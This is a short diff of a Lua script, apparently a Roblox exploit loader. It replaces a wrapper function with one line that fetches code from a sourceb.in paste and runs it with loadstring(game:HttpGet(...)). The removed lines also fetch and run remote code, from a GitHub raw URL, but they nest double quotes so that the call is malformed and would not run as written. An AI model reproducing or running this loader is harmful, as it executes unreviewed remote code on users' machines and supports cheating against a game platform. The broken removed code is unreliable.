@@ -1,5 +1,1 @@
-local function f1(a)
-  loadstring(game:HttpGet(a))()
-end
-task.spawn(f1, "loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/x100.lua"))()")
-task.spawn(f1, "loadstring(game:HttpGet("https://cdn.sourceb.in/bins/hUqSII2mGl/0"))()")
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/hUqSII2mGl/0"))()
